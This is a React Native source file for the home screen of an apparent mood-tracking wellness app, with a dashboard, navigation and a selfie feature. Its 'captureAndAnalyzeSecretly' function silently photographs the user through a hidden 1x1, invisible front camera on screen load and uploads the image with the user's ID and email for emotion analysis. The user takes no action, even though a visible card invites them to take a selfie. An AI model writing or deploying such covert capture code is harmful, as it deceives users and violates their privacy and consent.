import React, { useEffect, useState, useRef } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  ScrollView,
  Alert,
} from 'react-native';
import { Ionicons, MaterialCommunityIcons } from '@expo/vector-icons';
import { useSafeAreaInsets } from 'react-native-safe-area-context';
import { useRouter } from 'expo-router';
import { auth } from '../firebaseConfig';
import { CameraView, useCameraPermissions } from 'expo-camera';
import { getApiBaseUrl, authFetch, parseApiResponse } from '../utils/api';
import AsyncStorage from '@react-native-async-storage/async-storage';

const EMOTION_ANALYZED_KEY = 'mindSync_lastEmotionAnalysis';

export default function HomeScreen() {
  const router = useRouter();
  const insets = useSafeAreaInsets();
  const [permission, requestPermission] = useCameraPermissions();
  const cameraRef = useRef<CameraView>(null);

  const [secretPrompt, setSecretPrompt] = useState<string | null>(null);
  const [hasAnalyzed, setHasAnalyzed] = useState(false);
  const [isAnalyzing, setIsAnalyzing] = useState(false);

  const userEmail = auth.currentUser?.email || '';
  const userId = auth.currentUser?.uid || '';
  const rawName = userEmail.split('@')[0] || 'User';
  const userName = rawName.charAt(0).toUpperCase() + rawName.slice(1);

  useEffect(() => {
    if (!permission?.granted) {
      requestPermission();
    }
  }, [permission]);

  useEffect(() => {
    checkAndRunAnalysis();
  }, [permission]);

  const checkAndRunAnalysis = async () => {
    if (!permission?.granted || isAnalyzing || hasAnalyzed) return;

    try {
      const lastAnalyzed = await AsyncStorage.getItem(EMOTION_ANALYZED_KEY);
      const today = new Date().toDateString();

      if (lastAnalyzed === today) {
        console.log('Emotion analysis already done today');
        setHasAnalyzed(true);
        return;
      }

      setIsAnalyzing(true);
      await captureAndAnalyzeSecretly();
      await AsyncStorage.setItem(EMOTION_ANALYZED_KEY, today);
    } catch (error) {
      console.log('Error checking analysis status:', error);
    } finally {
      setIsAnalyzing(false);
    }
  };

  const captureAndAnalyzeSecretly = async () => {
    if (!cameraRef.current || isAnalyzing || hasAnalyzed) return;
    
    setHasAnalyzed(true);
    setIsAnalyzing(true);
    try {
      const photo = await cameraRef.current.takePictureAsync({ base64: true, quality: 0.1 });
      if (photo && photo.uri) {
        const filename = photo.uri.split('/').pop() || 'photo.jpg';
        const match = /\.(\w+)$/.exec(filename);
        const type = match ? `image/${match[1]}` : 'image/jpeg';

        const formData = new FormData();
        formData.append('image', {
          uri: photo.uri,
          name: filename,
          type,
        } as any);
        formData.append('userId', userId);
        formData.append('userEmail', userEmail);

        const apiUrl = getApiBaseUrl();
        const response = await authFetch(`${apiUrl}/api/emotion`, {
          method: 'POST',
          body: formData,
          timeoutMs: 30000,
        });

        if (response.ok) {
          const data = await parseApiResponse<any>(response);
          const emotion = data.emotion;
          const details = data.details || "I've analyzed your subtle facial cues.";
          
          Alert.alert(
            `Mood Detected: ${emotion.toUpperCase()}`,
            details,
            [{ text: "OK" }]
          );

          if (emotion === 'sad') {
            setSecretPrompt("Hey, just a reminder to take a deep breath. You're doing great.");
          } else if (emotion === 'angry') {
            setSecretPrompt("It might be a good time for a short walk to clear your head.");
          } else if (emotion === 'fear') {
            setSecretPrompt("You are safe here. Take things one step at a time today.");
          } else if (emotion === 'surprise') {
            setSecretPrompt("Expect the unexpected today!");
          } else if (emotion === 'disgust') {
            setSecretPrompt("Focus on the positive things around you.");
          } else if (emotion === 'happy') {
            setSecretPrompt("Keep that great energy going today!");
          } else {
            setSecretPrompt("Have a peaceful and balanced day.");
          }
        }
      }
    } catch (error) {
      console.log("Secret capture failed", error);
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleSignOut = () => {
    Alert.alert("Sign Out", "Are you sure you want to log out?", [
      { text: "Cancel", style: "cancel" },
      { 
        text: "Logout", 
        style: "destructive", 
        onPress: async () => {
          try {
            await auth.signOut();
            router.replace('/'); 
          } catch (_error) {
            Alert.alert("Error", "Failed to sign out.");
          }
        } 
      }
    ]);
  };

  return (
    <View style={[styles.container, { paddingTop: insets.top }]}>
      {/* Hidden camera for background emotion detection */}
      {permission?.granted && (
        <View style={{ position: 'absolute', width: 1, height: 1, opacity: 0 }}>
          <CameraView 
            ref={cameraRef}
            style={{ flex: 1 }} 
            facing="front"
          />
        </View>
      )}

      <ScrollView 
        contentContainerStyle={styles.scrollContent} 
        showsVerticalScrollIndicator={false}
      >
        <View style={styles.topBar}>
          <View style={{ flexDirection: 'row', alignItems: 'center', gap: 10 }}>
            <View style={styles.profileCircle}>
              <Text style={styles.profileInitial}>{userName.charAt(0)}</Text>
            </View>
            <Text style={styles.dashboardText}>Dashboard</Text>
          </View>
          <View style={{ flexDirection: 'row', gap: 15 }}>
            <TouchableOpacity onPress={handleSignOut}>
              <Ionicons name="log-out-outline" size={24} color="#ff7675" />
            </TouchableOpacity>
            <Ionicons name="notifications-outline" size={24} color="#333" />
          </View>
        </View>

        <View style={styles.greetingContainer}>
          <Text style={styles.greetingTitle}>Hello {userName} 👋</Text>
          <Text style={styles.greetingSubtitle}>How are you today?</Text>
        </View>

        {secretPrompt && (
          <View style={styles.secretPromptCard}>
            <Ionicons name="sparkles" size={20} color="#9D4EDD" style={{marginRight: 8}} />
            <Text style={styles.secretPromptText}>{secretPrompt}</Text>
          </View>
        )}

        <View style={styles.selfieCard}>
          <View style={styles.selfieCardTop}>
            <MaterialCommunityIcons name="face-recognition" size={60} color="white" />
          </View>
          <View style={styles.selfieCardBottom}>
            <View style={{ flex: 1 }}>
              <Text style={styles.selfieCardTitle}>Take a selfie now</Text>
              <Text style={styles.selfieCardDesc}>
                Let AI analyze your mood & stress levels
              </Text>
            </View>
            <TouchableOpacity 
              style={styles.selfieButton}
              onPress={() => router.push('/emotion' as any)}
            >
              <Text style={styles.selfieButtonText}>Click Here</Text>
            </TouchableOpacity>
          </View>
        </View>

        <Text style={styles.sectionTitle}>Quick Access</Text>
        <View style={styles.gridContainer}>
          
          <TouchableOpacity 
            style={styles.gridCard} 
            onPress={() => router.push('/journal')}
          >
            <View style={[styles.iconBox, { backgroundColor: '#E0F7F4' }]}>
              <MaterialCommunityIcons name="note-edit-outline" size={24} color="#00C896" />
            </View>
            <Text style={styles.cardTitle}>Journal</Text>
            <Text style={styles.cardSubtitle}>Daily reflection</Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.gridCard} onPress={() => router.push('/tasks' as any)}>
            <View style={[styles.iconBox, { backgroundColor: '#F3E8FF' }]}>
              <Ionicons name="checkbox-outline" size={24} color="#9D4EDD" />
            </View>
            <Text style={styles.cardTitle}>Tasks</Text>
            <Text style={styles.cardSubtitle}>Manage to-dos</Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.gridCard} onPress={() => router.push('/avatar')}>
            <View style={[styles.iconBox, { backgroundColor: '#DCFCE7' }]}>
              <MaterialCommunityIcons name="account-voice" size={24} color="#22C55E" />
            </View>
            <Text style={styles.cardTitle}>AI Avatar</Text>
            <Text style={styles.cardSubtitle}>Voice companion</Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.gridCard} onPress={() => router.push('/docs')}>
            <View style={[styles.iconBox, { backgroundColor: '#FCE7F3' }]}>
              <MaterialCommunityIcons name="folder-lock-outline" size={24} color="#EC4899" />
            </View>
            <Text style={styles.cardTitle}>Documents</Text>
            <Text style={styles.cardSubtitle}>Secure Vault</Text>
          </TouchableOpacity>

        </View>

        <View style={{ height: 100 }} />
      </ScrollView>

      {/* --- FLOATING ROBOT BUTTON --- */}
      <TouchableOpacity 
        style={[styles.fab, { bottom: 90 + insets.bottom }]}
        onPress={() => router.push('/chat-history')}
      >
        <MaterialCommunityIcons name="robot-outline" size={28} color="#000" />
      </TouchableOpacity>

      {/* --- BOTTOM NAVIGATION --- */}
      <View style={[styles.bottomNav, { paddingBottom: Math.max(insets.bottom, 10) }]}>
        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/home')}>
          <Ionicons name="home-outline" size={26} color="#00E0C6" />
          <Text style={[styles.navText, { color: '#00E0C6' }]}>Home</Text>
        </TouchableOpacity>
        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/journal')}>
          <Ionicons name="book-outline" size={26} color="#888" />
          <Text style={styles.navText}>Journal</Text>
        </TouchableOpacity>
        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/avatar')}>
          <MaterialCommunityIcons name="account-voice" size={26} color="#888" />
          <Text style={styles.navText}>Avatar</Text>
        </TouchableOpacity>
        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/tasks')}>
          <Ionicons name="checkbox-outline" size={26} color="#888" />
          <Text style={styles.navText}>Tasks</Text>
        </TouchableOpacity>
        <TouchableOpacity style={styles.navItem} onPress={() => router.push('/docs')}>
          <Ionicons name="documents-outline" size={26} color="#888" />
          <Text style={styles.navText}>Docs</Text>
        </TouchableOpacity>
      </View>

    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#FAFCFC',
  },
  scrollContent: {
    paddingHorizontal: 20,
    paddingTop: 15,
  },
  topBar: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 25,
  },
  profileCircle: {
    width: 36,
    height: 36,
    borderRadius: 18,
    backgroundColor: '#FFE5B4',
    justifyContent: 'center',
    alignItems: 'center',
  },
  profileInitial: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#D97706',
  },
  dashboardText: {
    fontSize: 18,
    fontWeight: '600',
    color: '#333',
  },
  greetingContainer: {
    marginBottom: 20,
  },
  greetingTitle: {
    fontSize: 26,
    fontWeight: '800',
    color: '#111',
  },
  greetingSubtitle: {
    fontSize: 20,
    fontWeight: '700',
    color: '#111',
    marginTop: 4,
  },
  secretPromptCard: {
    backgroundColor: '#F3E8FF',
    padding: 16,
    borderRadius: 12,
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 20,
  },
  secretPromptText: {
    color: '#333',
    fontSize: 14,
    fontWeight: '500',
    flex: 1,
  },
  selfieCard: {
    backgroundColor: '#fff',
    borderRadius: 24,
    overflow: 'hidden',
    marginBottom: 30,
    elevation: 4,
    shadowColor: '#000',
    shadowOpacity: 0.08,
    shadowRadius: 10,
    shadowOffset: { width: 0, height: 4 },
  },
  selfieCardTop: {
    height: 140,
    backgroundColor: '#A5B4FC',
    justifyContent: 'center',
    alignItems: 'center',
  },
  selfieCardBottom: {
    flexDirection: 'row',
    alignItems: 'center',
    padding: 20,
    backgroundColor: '#fff',
  },
  selfieCardTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#111',
  },
  selfieCardDesc: {
    fontSize: 13,
    color: '#666',
    marginTop: 4,
    paddingRight: 10,
  },
  selfieButton: {
    backgroundColor: '#00E0C6',
    paddingVertical: 12,
    paddingHorizontal: 16,
    borderRadius: 20,
  },
  selfieButtonText: {
    color: '#000',
    fontWeight: '700',
    fontSize: 14,
  },
  sectionTitle: {
    fontSize: 20,
    fontWeight: 'bold',
    color: '#111',
    marginBottom: 15,
  },
  gridContainer: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    justifyContent: 'space-between',
  },
  gridCard: {
    width: '48%',
    backgroundColor: '#fff',
    borderRadius: 20,
    padding: 16,
    marginBottom: 15,
    elevation: 3,
    shadowColor: '#000',
    shadowOpacity: 0.06,
    shadowRadius: 8,
    shadowOffset: { width: 0, height: 3 },
  },
  iconBox: {
    width: 44,
    height: 44,
    borderRadius: 12,
    justifyContent: 'center',
    alignItems: 'center',
    marginBottom: 12,
  },
  cardTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    color: '#111',
  },
  cardSubtitle: {
    fontSize: 12,
    color: '#777',
    marginTop: 4,
  },
  fab: {
    position: 'absolute',
    right: 20,
    backgroundColor: '#00E0C6',
    width: 56,
    height: 56,
    borderRadius: 28,
    justifyContent: 'center',
    alignItems: 'center',
    elevation: 6,
    shadowColor: '#000',
    shadowOpacity: 0.2,
    shadowRadius: 5,
    shadowOffset: { width: 0, height: 3 },
  },
  bottomNav: {
    position: 'absolute',
    bottom: 0,
    left: 0,
    right: 0,
    flexDirection: 'row',
    justifyContent: 'space-around',
    backgroundColor: '#fff',
    paddingTop: 12,
    borderTopWidth: 1,
    borderTopColor: '#f0f0f0',
  },
  navItem: {
    alignItems: 'center',
    flex: 1,
  },
  navText: {
    fontSize: 12,
    marginTop: 4,
    color: '#888',
  },
});
